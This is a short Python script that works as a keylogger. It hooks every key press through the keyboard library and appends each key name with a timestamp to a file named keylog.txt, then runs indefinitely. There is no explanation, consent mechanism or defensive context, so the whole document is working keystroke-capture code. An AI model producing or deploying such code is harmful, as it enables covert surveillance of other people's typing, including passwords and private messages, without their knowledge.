import keyboard
import datetime

log_file = "keylog.txt"

def on_press(event):
    with open(log_file, "a") as f:
        f.write(f"{event.name} - {datetime.datetime.now()}\n")

keyboard.on_press(on_press)

keyboard.wait()